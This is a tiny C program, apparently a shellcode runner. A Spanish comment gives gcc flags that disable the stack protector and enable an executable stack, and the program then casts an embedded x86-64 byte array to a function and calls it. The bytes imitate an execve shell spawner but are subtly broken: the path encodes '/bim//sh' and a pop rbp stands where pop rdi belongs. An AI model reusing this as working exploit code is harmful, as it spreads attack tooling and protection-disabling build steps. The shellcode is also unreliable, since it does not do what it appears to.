#include <stdio.h>
//Compilarlo asi:
//gcc -fno-stack-protector -Wl,-z,execstack  genShell.c -o shell

int main(void)
{
unsigned char shellcode[] = \

"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6d\x2f\x2f\x73\x68\x53\x54\x5d\xb0\x3b\x0f\x05";


    int (*ret)() = (int(*)())shellcode;
    ret();
}
